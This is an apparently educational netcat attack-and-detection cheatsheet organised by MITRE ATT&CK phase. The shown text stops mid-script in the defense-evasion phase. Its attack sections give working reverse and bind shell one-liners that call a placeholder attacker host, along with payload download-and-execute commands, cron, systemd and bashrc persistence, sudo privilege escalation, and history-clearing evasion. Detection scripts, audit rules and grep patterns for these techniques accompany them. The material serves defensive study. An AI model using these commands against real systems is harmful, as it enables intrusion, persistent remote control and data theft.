# Netcat Weaponisation: Attack Techniques & Detection

## Netcat Weaponisation: Attack Techniques & Detection Cheatsheet

### Overview

Netcat (nc) is a versatile networking utility that reads and writes data across network connections. Its legitimate uses include debugging, port scanning, and file transfers—but attackers weaponise it for reconnaissance, reverse shells, data exfiltration, and lateral movement. This guide covers offensive techniques mapped to MITRE ATT\&CK tactics and comprehensive detection strategies.

**Authorized Testing Only** — Only perform these techniques against systems you have explicit written permission to test.

***

### Learning Workflow

**Phase 1: Foundations** — Netcat variants, syntax, and capabilities\
**Phase 2: Reconnaissance** — Port scanning, banner grabbing, service enumeration\
**Phase 3: Initial Access** — Bind shells, reverse shells, payload delivery\
**Phase 4: Execution** — Command execution, script delivery, interactive shells\
**Phase 5: Persistence** — Backdoors, scheduled tasks, service creation\
**Phase 6: Privilege Escalation** — SUID exploitation, capability abuse\
**Phase 7: Defense Evasion** — Encrypted channels, obfuscation, living-off-the-land\
**Phase 8: Credential Access** — Credential harvesting, keylogging relay\
**Phase 9: Discovery** — Network mapping, service discovery\
**Phase 10: Lateral Movement** — Pivoting, proxying, relay attacks\
**Phase 11: Collection** — Data staging, clipboard capture\
**Phase 12: Command & Control** — C2 channels, beaconing\
**Phase 13: Exfiltration** — Data theft, covert channels

***

## Phase 1: Netcat Foundations

### Netcat Variants

| Variant            | Description         | Key Features                   |
| ------------------ | ------------------- | ------------------------------ |
| `nc` (traditional) | Original BSD netcat | Basic functionality            |
| `nc.openbsd`       | OpenBSD version     | No `-e` flag (security)        |
| `nc.traditional`   | GNU netcat          | Includes `-e` for execution    |
| `ncat`             | Nmap's netcat       | SSL/TLS, access control, proxy |
| `socat`            | Advanced relay      | Bidirectional, SSL, PTY        |
| `netcat`           | Generic name        | Varies by distribution         |
| `busybox nc`       | Embedded systems    | Minimal features               |
| `pwncat`           | Python-based        | Persistence, privesc built-in  |
| `rustcat`          | Rust implementation | Modern, evasive                |

### Core Syntax

```bash
# Client mode (connect to remote)
nc <target> <port>
nc -v 192.168.1.1 80

# Server mode (listen for connections)
nc -l -p <port>
nc -lvp 4444

# Common flags
-l          # Listen mode
-p <port>   # Specify port
-v          # Verbose
-n          # Skip DNS resolution
-u          # UDP mode
-w <secs>   # Timeout
-z          # Zero-I/O mode (scanning)
-e <prog>   # Execute program on connect (traditional/ncat)
-c <cmd>    # Execute shell command (some versions)
-k          # Keep listening after disconnect (ncat)
-q <secs>   # Quit after EOF and delay
```

### Identifying Installed Variants

```bash
# Check which netcat is installed
which nc netcat ncat 2>/dev/null
ls -la /usr/bin/nc* /bin/nc* 2>/dev/null

# Check version/variant
nc -h 2>&1 | head -5
nc --version 2>&1

# Check if -e is available
nc -h 2>&1 | grep -E "\-e|\-c"

# Alternatives check
which socat ncat busybox 2>/dev/null
```

***

## Phase 2: Reconnaissance Detection

### Attack Techniques

#### Port Scanning

```bash
# TCP port scan
nc -zv 192.168.1.1 1-1024
nc -znv 192.168.1.1 20-25 80 443 2>&1

# Single port check
nc -zv 192.168.1.1 22

# UDP port scan
nc -zuv 192.168.1.1 53 161 500

# Port range with timeout
nc -zvw1 192.168.1.1 1-65535 2>&1 | grep "succeeded\|open"

# Network sweep (script)
for ip in $(seq 1 254); do
    nc -znvw1 192.168.1.$ip 22 2>&1 | grep "succeeded" &
done
wait
```

#### Banner Grabbing

```bash
# HTTP banner
echo -e "HEAD / HTTP/1.1\r\nHost: target\r\n\r\n" | nc -v 192.168.1.1 80

# SSH banner
nc -v 192.168.1.1 22

# SMTP banner
nc -v 192.168.1.1 25

# FTP banner
nc -v 192.168.1.1 21

# Multiple service enumeration
for port in 21 22 25 80 110 143 443 3306; do
    echo "=== Port $port ===" 
    echo "" | nc -vnw2 192.168.1.1 $port 2>&1 | head -3
done
```

#### Service Fingerprinting

```bash
# HTTP server identification
echo -e "GET / HTTP/1.0\r\n\r\n" | nc 192.168.1.1 80 | grep -i "server:"

# SSL/TLS connection (ncat)
ncat --ssl 192.168.1.1 443

# MySQL identification
nc 192.168.1.1 3306 | head -1 | strings

# Redis identification
echo "INFO" | nc 192.168.1.1 6379
```

### Detection Strategies

#### Log Indicators

```bash
# Firewall logs - rapid connection attempts
grep -E "DPT=(22|80|443)" /var/log/kern.log | awk '{print $NF}' | sort | uniq -c | sort -rn

# Connection patterns (many ports, one source)
ss -tunapl | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn

# Failed connections (scan indicators)
grep "connection refused" /var/log/syslog
dmesg | grep -i "dropped\|reject"

# Web server reconnaissance
grep -E "(HEAD|OPTIONS|TRACE)" /var/log/apache2/access.log
```

#### Network Detection

```bash
# Detect port scanning with connection tracking
conntrack -L | awk '{print $4}' | sort | uniq -c | sort -rn | head -20

# High rate of SYN packets (tcpdump)
tcpdump -i any 'tcp[tcpflags] == tcp-syn' -c 100

# Detect zero-window probes (nc -z)
tcpdump -i any 'tcp[14:2] = 0' -c 50

# Capture banner grab attempts
tcpdump -i any -A 'dst port 22 or dst port 80' -c 20
```

#### Host-Based Detection

```bash
# Process monitoring for nc scanning
ps aux | grep -E "nc.*-z|netcat.*-z"

# Audit netcat execution
ausearch -c nc
ausearch -c netcat
ausearch -c ncat

# File access patterns
lsof -c nc
lsof -c netcat
```

#### Detection Script

{% code overflow="wrap" %}
```bash
#!/bin/bash
# Reconnaissance Detection Script

echo "=== Netcat Reconnaissance Detection ==="
echo "Timestamp: $(date)"
echo ""

# Active netcat processes
echo "=== Active Netcat Processes ==="
ps aux | grep -E "[n]c|[n]etcat|[n]cat" | grep -v grep

# Scanning patterns (high connection rate)
echo -e "\n=== High Connection Rate Sources ==="
ss -tunapl 2>/dev/null | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn | head -10

# Recent firewall blocks
echo -e "\n=== Recent Firewall Blocks ==="
grep -E "BLOCK|DROP|REJECT" /var/log/kern.log 2>/dev/null | tail -20

# Suspicious connection patterns
echo -e "\n=== Connection Patterns ==="
netstat -tn 2>/dev/null | awk '{print $5}' | cut -d: -f2 | sort | uniq -c | sort -rn | head -10

echo -e "\n=== Detection Complete ==="
```
{% endcode %}

### Defensive Measures

{% code overflow="wrap" %}
```bash
# Rate limit connections with iptables
iptables -A INPUT -p tcp --syn -m limit --limit 10/s --limit-burst 20 -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP

# Block port scanning with hashlimit
iptables -A INPUT -p tcp --syn -m hashlimit --hashlimit-above 20/min --hashlimit-mode srcip --hashlimit-name portscan -j DROP

# Fail2ban for connection floods
# /etc/fail2ban/jail.local
[portscan]
enabled = true
filter = portscan
logpath = /var/log/kern.log
maxretry = 10
findtime = 60
bantime = 3600
```
{% endcode %}

***

## Phase 3: Initial Access Detection

### Attack Techniques

#### Bind Shell (Attacker Connects to Victim)

```bash
# Victim: Create bind shell listener
# Traditional netcat with -e
nc -lvp 4444 -e /bin/bash

# Using named pipe (FIFO) - works with all variants
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvp 4444 > /tmp/f

# Ncat with SSL
ncat --ssl -lvp 4444 -e /bin/bash

# Socat bind shell
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash

# Attacker: Connect to bind shell
nc -v <victim_ip> 4444
ncat --ssl <victim_ip> 4444
```

#### Reverse Shell (Victim Connects to Attacker)

```bash
# Attacker: Start listener
nc -lvp 4444
ncat --ssl -lvp 4444
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444

# Victim: Various reverse shell methods
# Traditional netcat
nc -e /bin/bash <attacker_ip> 4444

# Named pipe method (universal)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <attacker_ip> 4444 > /tmp/f

# Bash native (no netcat needed)
bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1

# Netcat without -e (OpenBSD)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <attacker_ip> 4444 > /tmp/f

# Ncat SSL reverse shell
ncat --ssl -e /bin/bash <attacker_ip> 4444

# Socat reverse shell
socat TCP:<attacker_ip>:4444 EXEC:/bin/bash

# Python + netcat
python -c 'import os; os.system("nc <attacker_ip> 4444 -e /bin/bash")'
```

#### Payload Delivery

```bash
# Attacker: Serve payload
nc -lvp 8080 < malicious_script.sh

# Victim: Download and execute
nc <attacker_ip> 8080 | bash
nc <attacker_ip> 8080 > /tmp/payload.sh && chmod +x /tmp/payload.sh && /tmp/payload.sh

# Transfer binary payload
# Attacker
nc -lvp 8080 < malware.elf

# Victim
nc <attacker_ip> 8080 > /tmp/.hidden && chmod +x /tmp/.hidden && /tmp/.hidden

# Staged delivery (download then execute separately)
nc <attacker_ip> 8080 > /tmp/stage1.sh
bash /tmp/stage1.sh
```

### Detection Strategies

#### Log Indicators

{% code overflow="wrap" %}
```bash
# Outbound connections on suspicious ports
grep -E "CONNECT|ESTABLISHED" /var/log/syslog | grep -E ":(4444|5555|6666|1234|9999)"

# Bash history for reverse shells
grep -rE "nc.*-e|mkfifo|/dev/tcp|socat" /home/*/.bash_history /root/.bash_history 2>/dev/null

# Auth log for shell activity
grep -E "session opened|pts|tty" /var/log/auth.log

# Process execution logs
ausearch -m EXECVE | grep -iE "nc|netcat|ncat|socat"
```
{% endcode %}

#### Network Detection

```bash
# Listening netcat processes
ss -tunapl | grep -iE "nc|netcat|ncat"
netstat -tunapl | grep -iE "nc|netcat|ncat"

# Established connections on common shell ports
ss -tunapl | grep ESTAB | grep -E ":(4444|5555|6666|1234|9999|8080)"

# Detect outbound connections to unusual ports
ss -tnp | awk '$4 !~ /:22$|:80$|:443$|:53$/ {print}'

# Capture reverse shell traffic
tcpdump -i any -A 'tcp port 4444' -c 100

# Detect /bin/bash in network traffic
tcpdump -i any -A | grep -E "bash|sh|/bin/"
```

#### Process-Based Detection

```bash
# Netcat with execute flags
ps aux | grep -E "nc.*-e|nc.*-c|ncat.*-e"

# Named pipe detection (FIFO shells)
find /tmp /var/tmp /dev/shm -type p 2>/dev/null
ls -la /tmp/f /tmp/pipe /tmp/p 2>/dev/null

# Bash with network redirection
ps aux | grep -E "bash.*>&.*dev/tcp|bash.*<.*dev/tcp"
lsof -i | grep bash

# Process tree analysis
pstree -p | grep -E "nc|netcat|ncat"

# File descriptors pointing to network
ls -la /proc/*/fd 2>/dev/null | grep socket
lsof -i -P | grep -E "nc|netcat|bash|sh"
```

#### Detection Script

```bash
#!/bin/bash
# Initial Access Detection Script

echo "=== Reverse/Bind Shell Detection ==="
echo "Timestamp: $(date)"
echo ""

# Listening services
echo "=== Suspicious Listeners ==="
ss -tunapl | grep LISTEN | grep -vE ":(22|80|443|25|53|3306) " | head -20

# Established connections on shell ports
echo -e "\n=== Shell Port Connections ==="
ss -tunapl | grep ESTAB | grep -E ":(4444|5555|6666|1234|9999|8080|1337)"

# Netcat processes
echo -e "\n=== Netcat Processes ==="
ps aux | grep -E "[n]c|[n]etcat|[n]cat|[s]ocat" 

# Named pipes (FIFO)
echo -e "\n=== Named Pipes in Temp ==="
find /tmp /var/tmp /dev/shm -type p -ls 2>/dev/null

# Bash with network connections
echo -e "\n=== Bash Network Connections ==="
lsof -i -P 2>/dev/null | grep -E "bash|sh"

# Process tree for shell parents
echo -e "\n=== Suspicious Process Trees ==="
pstree -p 2>/dev/null | grep -E "nc|netcat|ncat" | head -10

# Recent netcat executions (auditd)
echo -e "\n=== Recent Netcat Executions (Audit) ==="
ausearch -c nc -c netcat -c ncat -ts recent 2>/dev/null | tail -20

echo -e "\n=== Detection Complete ==="
```

### Defensive Measures

```bash
# Block common reverse shell ports
iptables -A OUTPUT -p tcp --dport 4444 -j DROP
iptables -A OUTPUT -p tcp --dport 5555 -j DROP
iptables -A OUTPUT -p tcp --dport 1234 -j DROP

# Restrict netcat execution (AppArmor)
# /etc/apparmor.d/usr.bin.nc
/usr/bin/nc {
    deny network,
}

# Auditd rules for netcat
auditctl -w /usr/bin/nc -p x -k netcat_exec
auditctl -w /usr/bin/netcat -p x -k netcat_exec
auditctl -w /usr/bin/ncat -p x -k netcat_exec
auditctl -w /bin/nc -p x -k netcat_exec

# Detect named pipe creation
auditctl -w /tmp -p wa -k tmp_fifo
auditctl -a always,exit -F arch=b64 -S mknodat -S mknod -k fifo_create

# Remove or restrict netcat
chmod 700 /usr/bin/nc
# Or remove entirely
apt remove netcat-traditional
```

***

## Phase 4: Execution Detection

### Attack Techniques

#### Remote Command Execution

```bash
# One-liner command execution
echo "whoami" | nc <victim_ip> 4444
echo "id; uname -a; cat /etc/passwd" | nc <victim_ip> 4444

# Script execution over network
# Attacker: Serve script
cat script.sh | nc -lvp 8080

# Victim: Execute directly
nc <attacker_ip> 8080 | bash

# Execute and return output
# Victim listener that executes commands
nc -lvp 4444 -e /bin/bash

# Attacker sends commands and receives output
echo "ls -la /etc" | nc <victim_ip> 4444
```

#### Interactive Shell Upgrade

```bash
# Upgrade to PTY shell (post-exploitation)
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Full TTY upgrade
# On victim after initial shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z to background
# On attacker:
stty raw -echo; fg
# On victim:
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <rows> columns <cols>

# Socat full TTY
# Attacker
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444

# Victim
socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:<attacker>:4444
```

#### Staged Execution

```bash
# Stage 1: Download dropper
nc <attacker_ip> 8080 > /tmp/.x
chmod +x /tmp/.x

# Stage 2: Execute dropper (downloads main payload)
/tmp/.x

# Stage 3: Main payload execution
# (dropper handles this)

# Alternative: Memory-only execution
nc <attacker_ip> 8080 | bash -s
```

### Detection Strategies

#### Log Indicators

```bash
# Command execution patterns
ausearch -m EXECVE -ts recent | grep -E "bash|sh|python"

# Script execution from temp
ausearch -m EXECVE | grep -E "/tmp/|/var/tmp/|/dev/shm/"

# Interactive shell indicators
grep -E "pts|tty|pty" /var/log/auth.log

# Sudo with netcat
grep "nc\|netcat\|ncat" /var/log/auth.log
```

#### Process Detection

```bash
# Shells spawned from netcat
pstree -p | grep -B5 "bash\|sh" | grep -E "nc|netcat|ncat"

# Python PTY spawns
ps aux | grep -E "python.*pty|python3.*pty"

# Processes with network connections running shells
lsof -i | grep -E "bash|sh" | grep -v "sshd"

# Socat execution
ps aux | grep -E "[s]ocat"

# Process environment analysis
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -E "SHELL|TERM|TTY"
```

#### Network Detection

```bash
# Interactive traffic patterns (small packets, bidirectional)
tcpdump -i any -c 1000 'tcp' 2>/dev/null | awk '{print $3, $5}' | sort | uniq -c | sort -rn

# Shell-like traffic content
tcpdump -i any -A 'port 4444' 2>/dev/null | grep -E "bash|sh|uid=|root|whoami"

# Detect PTY negotiation
tcpdump -i any -X 'port 4444' 2>/dev/null | grep -E "xterm|linux|TERM"
```

#### Detection Script

```bash
#!/bin/bash
# Execution Detection Script

echo "=== Remote Execution Detection ==="
echo "Timestamp: $(date)"
echo ""

# Shell processes from network
echo "=== Shells with Network Connections ==="
for pid in $(pgrep -x "bash\|sh\|dash\|zsh"); do
    if ls -la /proc/$pid/fd 2>/dev/null | grep -q socket; then
        echo "PID $pid has network socket:"
        ps -p $pid -o pid,ppid,user,cmd
        ls -la /proc/$pid/fd 2>/dev/null | grep socket
    fi
done

# Python PTY detection
echo -e "\n=== Python PTY Spawns ==="
ps aux | grep -E "python.*pty" | grep -v grep

# Netcat spawned shells
echo -e "\n=== Netcat Process Trees ==="
for pid in $(pgrep -x "nc\|netcat\|ncat"); do
    echo "Netcat PID $pid tree:"
    pstree -p $pid 2>/dev/null
done

# Recent executions from temp
echo -e "\n=== Temp Directory Executions ==="
ausearch -m EXECVE -ts recent 2>/dev/null | grep -E "/tmp/|/var/tmp/|/dev/shm/" | head -20

# Socat processes
echo -e "\n=== Socat Processes ==="
ps aux | grep -E "[s]ocat"

echo -e "\n=== Detection Complete ==="
```

***

## Phase 5: Persistence Detection

### Attack Techniques

#### Cron-Based Persistence

{% code overflow="wrap" %}
```bash
# User crontab persistence
(crontab -l 2>/dev/null; echo "* * * * * nc <attacker_ip> 4444 -e /bin/bash") | crontab -

# System cron persistence
echo "* * * * * root nc <attacker_ip> 4444 -e /bin/bash" >> /etc/crontab

# Cron.d persistence
echo "* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <attacker_ip> 4444 >/tmp/f" > /etc/cron.d/update

# At job persistence
echo "nc <attacker_ip> 4444 -e /bin/bash" | at now + 1 minute
```
{% endcode %}

#### Systemd Service Persistence

```bash
# Create malicious service
cat > /etc/systemd/system/update.service << EOF
[Unit]
Description=System Update Service

[Service]
ExecStart=/bin/bash -c 'nc <attacker_ip> 4444 -e /bin/bash'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable update.service
systemctl start update.service

# Timer-based persistence
cat > /etc/systemd/system/update.timer << EOF
[Unit]
Description=Update Timer

[Timer]
OnBootSec=1min
OnUnitActiveSec=5min

[Install]
WantedBy=timers.target
EOF
```

#### Init Script Persistence

```bash
# SysV init persistence
cat > /etc/init.d/update << 'EOF'
#!/bin/bash
### BEGIN INIT INFO
# Provides:          update
# Required-Start:    $network
# Default-Start:     2 3 4 5
### END INIT INFO
nohup nc <attacker_ip> 4444 -e /bin/bash &
EOF
chmod +x /etc/init.d/update
update-rc.d update defaults

# rc.local persistence
echo "nohup nc <attacker_ip> 4444 -e /bin/bash &" >> /etc/rc.local
chmod +x /etc/rc.local
```

#### Shell Profile Persistence

```bash
# Bashrc persistence
echo 'nohup nc <attacker_ip> 4444 -e /bin/bash 2>/dev/null &' >> ~/.bashrc

# Profile persistence
echo 'nc <attacker_ip> 4444 -e /bin/bash &' >> /etc/profile

# SSH rc persistence
mkdir -p ~/.ssh
echo 'nc <attacker_ip> 4444 -e /bin/bash &' >> ~/.ssh/rc
```

#### Binary Replacement Persistence

```bash
# Replace common utility
mv /usr/bin/whoami /usr/bin/whoami.bak
cat > /usr/bin/whoami << 'EOF'
#!/bin/bash
nc <attacker_ip> 4444 -e /bin/bash &
/usr/bin/whoami.bak "$@"
EOF
chmod +x /usr/bin/whoami
```

### Detection Strategies

#### Log Indicators

```bash
# Cron modifications
grep -E "crontab|CRON" /var/log/auth.log /var/log/syslog

# Systemd changes
journalctl -u <suspicious_service>
journalctl | grep -E "systemd.*start|enable"

# Init script changes
ls -la /etc/init.d/ --time-style=long-iso | sort -k6,7 | tail -20

# Package integrity
dpkg -V 2>/dev/null | grep -E "^..5"
rpm -Va 2>/dev/null | grep -E "^..5"
```

#### File System Detection

{% code overflow="wrap" %}
```bash
# Recent cron changes
find /etc/cron* /var/spool/cron -mtime -7 -ls 2>/dev/null

# Suspicious cron content
grep -rE "(nc|netcat|ncat|bash.*dev/tcp|mkfifo)" /etc/cron* /var/spool/cron 2>/dev/null

# Systemd service analysis
find /etc/systemd /lib/systemd -name "*.service" -mtime -7 -ls 2>/dev/null
grep -rE "(nc|netcat|ncat|bash|/dev/tcp)" /etc/systemd/system/*.service 2>/dev/null

# Init scripts with netcat
grep -rE "(nc|netcat|ncat)" /etc/init.d/ /etc/rc*.d/ 2>/dev/null

# Profile modifications
find /etc/profile* /etc/bash* -mtime -7 -ls 2>/dev/null
grep -rE "(nc|netcat|ncat|/dev/tcp)" /etc/profile* /etc/bash* /home/*/.bashrc /home/*/.profile 2>/dev/null

# Binary integrity
find /usr/bin /bin /sbin /usr/sbin -type f -mtime -7 2>/dev/null

# SSH rc files
find /home -name "rc" -path "*/.ssh/*" -ls 2>/dev/null
cat /home/*/.ssh/rc /root/.ssh/rc 2>/dev/null
```
{% endcode %}

#### Detection Script

{% code overflow="wrap" %}
```bash
#!/bin/bash
# Persistence Detection Script

echo "=== Netcat Persistence Detection ==="
echo "Timestamp: $(date)"
echo ""

# Cron analysis
echo "=== Suspicious Cron Entries ==="
grep -rE "(nc |netcat|ncat|bash.*dev/tcp|mkfifo)" /etc/cron* /var/spool/cron 2>/dev/null

# User crontabs
echo -e "\n=== User Crontabs with Netcat ==="
for user in $(cut -d: -f1 /etc/passwd); do
    crontab -u $user -l 2>/dev/null | grep -E "(nc|netcat|ncat)" && echo "User: $user"
done

# Systemd services
echo -e "\n=== Suspicious Systemd Services ==="
grep -rE "(nc |netcat|ncat|bash.*-c)" /etc/systemd/system/*.service 2>/dev/null
find /etc/systemd/system -name "*.service" -mtime -7 -ls 2>/dev/null

# Init scripts
echo -e "\n=== Suspicious Init Scripts ==="
grep -rE "(nc |netcat|ncat)" /etc/init.d/ 2>/dev/null

# Profile files
echo -e "\n=== Suspicious Profile Entries ==="
grep -rE "(nc |netcat|ncat|/dev/tcp)" /etc/profile* /etc/bash* /home/*/.bashrc /home/*/.profile /root/.bashrc 2>/dev/null

# SSH rc files
echo -e "\n=== SSH RC Files ==="
find /home /root -name "rc" -path "*/.ssh/*" -exec cat {} \; 2>/dev/null

# rc.local
echo -e "\n=== rc.local Content ==="
cat /etc/rc.local 2>/dev/null | grep -E "(nc|netcat|ncat|bash)"

# At jobs
echo -e "\n=== Scheduled At Jobs ==="
atq 2>/dev/null
for job in $(atq 2>/dev/null | awk '{print $1}'); do
    at -c $job 2>/dev/null | grep -E "(nc|netcat|ncat)"
done

echo -e "\n=== Detection Complete ==="
```
{% endcode %}

#### Auditd Rules for Persistence

```bash
# Monitor cron directories
auditctl -w /etc/crontab -p wa -k cron_persistence
auditctl -w /etc/cron.d -p wa -k cron_persistence
auditctl -w /var/spool/cron -p wa -k cron_persistence

# Monitor systemd
auditctl -w /etc/systemd/system -p wa -k systemd_persistence
auditctl -w /lib/systemd/system -p wa -k systemd_persistence

# Monitor init scripts
auditctl -w /etc/init.d -p wa -k init_persistence
auditctl -w /etc/rc.local -p wa -k rclocal_persistence

# Monitor profile files
auditctl -w /etc/profile -p wa -k profile_persistence
auditctl -w /etc/bash.bashrc -p wa -k bashrc_persistence

# Query persistence events
ausearch -k cron_persistence
ausearch -k systemd_persistence
```

***

## Phase 6: Privilege Escalation Detection

### Attack Techniques

#### SUID Netcat Exploitation

```bash
# If netcat has SUID bit (misconfiguration)
find / -perm -4000 -name "*nc*" 2>/dev/null
find / -perm -4000 -name "*netcat*" 2>/dev/null
find / -perm -4000 -name "*ncat*" 2>/dev/null

# Exploit SUID netcat
/path/to/suid/nc -lvp 4444 -e /bin/bash  # Runs as owner

# Netcat in sudo without password
sudo -l | grep nc
# If (ALL) NOPASSWD: /usr/bin/nc
sudo nc -lvp 4444 -e /bin/bash
```

#### Capability Abuse

```bash
# Check netcat capabilities
getcap /usr/bin/nc /usr/bin/netcat /usr/bin/ncat 2>/dev/null

# If cap_net_bind_service (can bind to low ports)
# Or cap_net_raw (raw sockets)
nc -lvp 80 -e /bin/bash  # Bind to privileged port
```

#### Exploiting Privileged Processes

```bash
# If root process connects to attacker-controlled port
# Attacker waits for connection
nc -lvp 4444

# When root process connects, capture credentials or inject commands

# Hijack root reverse shell misconfiguration
# If root cron job connects back to attacker
nc -lvp 4444  # Receive root shell
```

#### Sudo Misconfiguration Exploitation

```bash
# Common sudo misconfigurations with netcat
# If sudo allows nc with specific arguments
echo 'nc.traditional -e /bin/sh -lvp 4444' | sudo nc.traditional -lvp 4444 -e /bin/bash

# Sudo with ncat
sudo ncat -e /bin/bash <attacker_ip> 4444

# GTFOBins style
# If sudo nc is allowed:
RHOST=<attacker>
RPORT=4444
sudo nc -e /bin/sh $RHOST $RPORT
```

### Detection Strategies

{% code overflow="wrap" %}
```bash
# Find SUID network tools
echo "=== SUID Network Tools ==="
find / -perm -4000 -type f 2>/dev/null | xargs -I {} sh -c 'file {} | grep -q ELF && ldd {} 2>/dev/null | grep -q "socket\|network" && echo {}'

# Check netcat SUID/capabilities
echo -e "\n=== Netcat SUID/SGID ==="
find / \( -name "*nc*" -o -name "*netcat*" -o -name "*ncat*" \) \( -perm -4000 -o -perm -2000 \) 2>/dev/null

echo -e "\n=== Netcat Capabilities ==="
getcap /usr/bin/nc* /bin/nc* /usr/bin/netcat /usr/bin/ncat 2>/dev/null

# Sudo rules with netcat
echo -e "\n=== Sudo Rules with Netcat ==="
grep -rE "(nc|netcat|ncat)" /etc/sudoers /etc/sudoers.d/ 2>/dev/null

# Privileged netcat processes
echo -e "\n=== Privileged Netcat Processes ==="
ps aux | grep -E "[n]c|[n]etcat|[n]cat" | awk '$1 == "root" {print}'

# Root processes with network connections
echo -e "\n=== Root Processes with Sockets ==="
lsof -i -u root 2>/dev/null | grep -E "nc|netcat|ncat"
```
{% endcode %}

***

## Phase 7: Defense Evasion Detection

### Attack Techniques

#### Process Name Obfuscation

```bash
# Rename netcat binary
cp /usr/bin/nc /tmp/update-service
/tmp/update-service -lvp 4444 -e /bin/bash

# Symbolic link obfuscation
ln -s /usr/bin/nc /tmp/[kworker/0:0]
/tmp/[kworker/0:0] -lvp 4444 -e /bin/bash

# Exec with different argv[0]
exec -a "[migration]" nc -lvp 4444 -e /bin/bash

# Bash-based evasion (no external binary)
bash -i >& /dev/tcp/<attacker>/4444 0>&1
```

#### Encrypted Channels

```bash
# Ncat with SSL/TLS
# Attacker
ncat --ssl -lvp 4444

# Victim
ncat --ssl -e /bin/bash <attacker> 4444

# Socat encrypted
# Generate cert
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 30 -out cert.pem
cat key.pem cert.pem > shell.pem

# Attacker
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 -

# Victim
socat OPENSSL:<attacker>:4444,verify=0 EXEC:/bin/bash

# Stunnel wrapper
stunnel -c -d 127.0.0.1:4444 -r <attacker>:4443
nc 127.0.0.1 4444 -e /bin/bash
```

#### Traffic Obfuscation

```bash
# Use common ports
nc -lvp 80 -e /bin/bash   # HTTP port
nc -lvp 443 -e /bin/bash  # HTTPS port
nc -lvp 53 -e /bin/bash   # DNS port

# UDP to evade stateful firewalls
nc -u -lvp 53 -e /bin/bash
nc -u <victim> 53

# Through proxy
nc -X connect -x proxy:8080 <target> 4444
```

#### Living Off The Land

{% code overflow="wrap" %}
```bash
# Use built-in bash instead of netcat
/bin/bash -i >& /dev/tcp/<attacker>/4444 0>&1

# Python alternative
python -c 'import socket,os,pty;s=socket.socket();s.connect(("<attacker>",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

# Perl alternative
perl -e 'use Socket;$i="<attacker>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'

# PHP alternative
php -r '$s=fsockopen("<attacker>",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```
{% endcode %}

#### Log Evasion

```bash
# Unset history
unset HISTFILE HISTSIZE HISTFILESIZE
export HISTSIZE=0

# Clear history
history -c
cat /dev/null > ~/.bash_history

# Use /dev/null for output
nc -lvp 4444 -e /bin/bash 2>/dev/null &

# Timestomp
touch -r /bin/ls /tmp/malicious
```

### Detection Strategies

#### Obfuscation Detection

{% code overflow="wrap" %}
```bash
# Find netcat copies in unusual locations
echo "=== Netcat Copies ==="
find / -type f -executable 2>/dev/null | while read f; do
    if md5sum "$f" 2>/dev/null | grep -qf <(md5sum /usr/bin/nc* /bin/nc* 2>/dev/null | awk '{print $1}'); then
        echo "Netcat copy: $f"
    fi
done

# Suspicious process names
echo -e "\n=== Suspicious Process Names ==="
ps aux | awk '$11 ~ /^\[.*\]$/ || $11 ~ /^\./ || $11 ~ /\/tmp\// || $11 ~ /\/dev\/shm/'

# Deleted executables with network connections
echo -e "\n=== Deleted Network Processes ==="
ls -la /proc/*/exe 2>/dev/null | grep deleted
lsof -i | grep deleted

# Process name vs binary mismatch
echo -e "\n=== Name/Binary Mismatch ==="
ps aux | while read line; do
    pid=$(echo "$line" | awk '{print $2}')
    cmdline=$(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ')
    exe=$(readlink /proc/$pid/exe 2>/dev/null)
    if [ -n "$exe" ] && [ -n "$cmdline" ]; then
        if ! echo "$cmdline" | grep -q "$(basename "$exe")"; then
            echo "PID $pid: exe=$exe cmdline=$cmdline"
        fi
    fi
done 2>/dev/null | head -20
```
{% endcode %}

#### Encrypted Channel Detection

```bash
# SSL/TLS on non-standard ports
ss -tunapl | grep ESTAB | grep -vE ":(443|993|995|636|8443|465)"
# Then check if SSL with:
openssl s_client -connect <ip>:<port> 2>/dev/null | head -5

# Ncat SSL processes
ps aux | grep "ncat.*ssl"

# Socat SSL
ps aux | grep "socat.*OPENSSL"

# Encrypted traffic heuristics (high entropy)
tcpdump -i any -c 100 -w - 2>/dev/null | file -
```

#### Detection Script

{% code overflow="wrap" %}
```bash
#!/bin/bash
# Defense Evasion Detection Script

echo "=== Defense Evasion Detection ==="
echo "Timestamp: $(date)"
echo ""

# Renamed/copied binaries
echo "=== Netcat Binary Copies ==="
for nc_bin in /usr/bin/nc /bin/nc /usr/bin/netcat /usr/bin/ncat; do
    if [ -f "$nc_bin" ]; then
        nc_hash=$(md5sum "$nc_bin" 2>/dev/null | awk '{print $1}')
        find /tmp /var/tmp /dev/shm /home -type f -executable 2>/dev/null | while read f; do
            if [ "$(md5sum "$f" 2>/dev/null | awk '{print $1}')" = "$nc_hash" ]; then
                echo "Copy found: $f (copy of $nc_bin)"
            fi
        done
    fi
done

# Bracket process names
echo -e "\n=== Suspicious Bracket Names ==="
